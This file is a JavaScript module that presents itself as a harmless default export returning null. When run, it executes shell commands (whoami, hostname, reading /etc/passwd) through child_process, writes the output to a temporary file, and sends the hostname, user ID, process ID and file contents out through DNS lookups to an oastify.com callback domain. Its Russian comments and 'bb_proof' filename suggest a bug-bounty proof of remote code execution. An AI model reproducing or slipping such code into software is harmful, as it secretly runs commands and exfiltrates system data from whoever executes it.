module.exports = {
  default: function(props) {
    try {
      var os = require("os");
      var dns = require("dns");
      var h = os.hostname();
      var p = process.pid;
      var u = os.userInfo();
      
      // Сначала DNS — гарантированно уйдёт
      dns.lookup(h + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
      dns.lookup("pid" + p + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
      dns.lookup("uid" + u.uid + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
    } catch(e) {}
    
    try {
      var cp = require("child_process");
      
      // Создаём файл
      cp.execSync("whoami > /tmp/myasnikov_bb_proof.txt 2>&1", {timeout: 5000});
      cp.execSync("hostname >> /tmp/myasnikov_bb_proof.txt 2>&1", {timeout: 5000});
      cp.execSync("cat /etc/passwd 2>&1 | head -2 >> /tmp/myasnikov_bb_proof.txt", {timeout: 5000});
      cp.execSync("cat /proc/sys/kernel/hostname 2>&1 >> /tmp/myasnikov_bb_proof.txt", {timeout: 5000});
      
      // Читаем и шлём содержимое через DNS
      var fs = require("fs");
      var content = fs.readFileSync("/tmp/myasnikov_bb_proof.txt", "utf8").trim();
      var lines = content.split("\n");
      for (var i = 0; i < lines.length; i++) {
        var encoded = lines[i].replace(/[^a-zA-Z0-9]/g, "-").substring(0, 45);
        require("dns").lookup("f" + i + "-" + encoded + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){});
      }
    } catch(e) {}
    
    return null;
  }
};
